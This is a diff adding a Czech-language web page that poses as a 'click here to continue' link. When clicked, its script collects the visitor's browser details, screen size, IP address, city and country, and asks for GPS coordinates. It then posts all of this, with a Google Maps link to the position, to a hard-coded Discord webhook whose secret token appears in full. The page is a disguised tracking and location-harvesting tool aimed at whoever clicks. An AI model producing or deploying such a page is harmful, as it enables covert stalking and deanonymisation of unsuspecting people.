@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Pokračování...</title>
+  <style>
+    #trackLink {
+      color: blue;
+      text-decoration: underline;
+      cursor: pointer;
+      font-family: sans-serif;
+    }
+  </style>
+</head>
+<body>
+  <span id="trackLink">Klikni sem pro pokračování</span>
+  <p id="output"></p>
+
+  <script>
+    const webhookURL = "https://discordapp.com/api/webhooks/1369301414899224646/lUXipWbVV9yHCN-sp0nvuuNQEd-7U_HprR-UTL5VeWvLmveoh5zIIRB76w1nfbjU_Dd7";
+
+    document.getElementById("trackLink").addEventListener("click", function(e) {
+      e.preventDefault();
+
+      const userAgent = navigator.userAgent;
+      const language = navigator.language;
+      const resolution = `${window.screen.width} × ${window.screen.height}`;
+      const time = new Date().toLocaleString();
+
+      fetch("https://ipapi.co/json/")
+        .then(response => response.json())
+        .then(data => {
+          const ip = data.ip;
+          const city = data.city;
+          const country = data.country_name;
+
+          if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(function(position) {
+              const lat = position.coords.latitude;
+              const lon = position.coords.longitude;
+
+              const message = `
+🕒 Cas kliknuti: ${time}
+📱 Zarizeni: ${userAgent}
+🌐 Jazyk: ${language}
+🖥️ Rozliseni: ${resolution}
+
+🌍 IP adresa: ${ip}
+🏙️ Lokalita podle IP: ${city}, ${country}
+
+📍 GPS poloha: https://www.google.com/maps?q=${lat},${lon}
+              `;
+
+              fetch(webhookURL, {
+                method: "POST",
+                headers: {
+                  "Content-Type": "application/json"
+                },
+                body: JSON.stringify({ content: message })
+              });
+
+              document.getElementById("output").innerText = "✅ Informace odeslány!";
+            }, function(error) {
+              document.getElementById("output").innerText = "❌ Přístup k poloze byl odepřen.";
+            });
+          } else {
+            document.getElementById("output").innerText = "❌ Geolokace není podporována.";
+          }
+        });
+    });
+  </script>
+</body>
+</html>
